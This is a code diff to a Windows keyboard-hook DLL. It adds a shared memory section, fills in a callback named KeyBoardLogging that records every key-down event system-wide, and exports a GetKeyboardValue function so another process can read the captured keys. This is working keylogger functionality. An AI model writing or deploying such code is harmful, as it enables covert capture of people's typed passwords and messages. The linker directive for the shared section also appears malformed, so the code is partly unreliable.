@@ -4,7 +4,13 @@
 #include <tchar.h>
 
 #define STR_MODULE_NAME					    L"KeyBoardHook.dll"
-#define STATUS_SUCCESS						(0x00000000L) 
+#define STATUS_SUCCESS						(0x00000000L)
+
+#pragma data_seg(".share")
+char whatNowKeyDown = 0;
+BOOL isNewKeyHit = FALSE;
+#pragma data_seg()
+#pragma comment(linker,"/SECTION:.share.RS")
 
 typedef LONG NTSTATUS;
 typedef struct _CLIENT_ID 
@@ -232,6 +238,15 @@ LRESULT CALLBACK KeyBoardLogging(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	//add process
 
+	if (nCode >= 0)
+	{
+		if (!(lParam & 0x80000000))
+		{
+			whatNowKeyDown = wParam;
+			isNewKeyHit = TRUE;
+		}
+	}
+
 	return CallNextHookEx(g_hook, nCode, wParam, lParam);
 }
 
@@ -262,3 +277,13 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 
 	return TRUE;
 }
+#ifdef __cplusplus
+extern "C"
+{
+	_declspec(dllexport) char GetKeyboardValue()
+	{
+		isNewKeyHit = FALSE;
+		return whatNowKeyDown;
+	}
+}
+#endif
